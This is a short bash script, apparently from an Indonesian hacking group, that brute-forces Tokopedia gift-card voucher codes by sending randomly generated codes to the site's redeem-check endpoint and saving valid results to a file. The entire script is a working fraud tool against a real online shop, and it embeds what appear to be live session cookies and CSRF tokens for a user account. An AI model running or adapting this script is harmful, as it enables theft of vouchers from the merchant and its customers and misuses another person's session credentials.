#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ3NjUzNnxJakU0VDJ0Wk1YWnlXU3R2YWtGRk5TOWpMMDQ0TTJoVk5YSmpUakYyWlZwM09Ya3lUMFUwZEcxRU1FVTlJZ289fE8whaMXO560xTDuxNhtMSwyR-8v3lp8U20dS5YnGTUh; state=eyJyZWYiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tIiwidXVpZCI6IjRiYzkwMjZiLWUwMjktNDA5YS04M2JkLTA4MmM0ZGNhMjk0MCIsInAiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tIn0; l=1; _ID_autocomplete_=4971f5e676b6407fbf90cbb84ed8b4e7; vn_is=1; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; MTIntpt=0; _dc_gtm_UA-9801603-1=1; _gat_UA-9801603-1=1; ins-gaSSId=8f47c92d-f9ba-9e3d-593b-6c818b973438_1524480096; scs=%7B%22t%22%3A1%7D; insdrSV=1; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiMjAxZDNmMDQtZDc4YS00OTI4LWE3ODgtY2Y4N2EyM2FlNmJlIiwiaXNfYWpheCI6dHJ1ZX0; _SID_Tokopedia_=IQ-IrCWSIRZB10NLGLIlt9jaVrO7jJJm5bKP5F2YiGL7zvoekkK5NOpBxMN4W7b0SvW578g4aDD7ZBBzRf0_KdgK51ysrbi3FKNxrB1YMPXTE6wC-CJ76CzgXOqwDcfJ; pulsa-aff=undefined; _ga=GA1.2.1650870970.1524476490; _gid=GA1.2.435626165.1524476490; _dc_gtm_UA-9801603-23=1; _ga=GA1.3.1650870970.1524476490; _gid=GA1.3.435626165.1524476490; _gat_UA-9801603-23=1; __asc=09222674162f1e1259237f32f13; __auc=09222674162f1e1259237f32f13"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
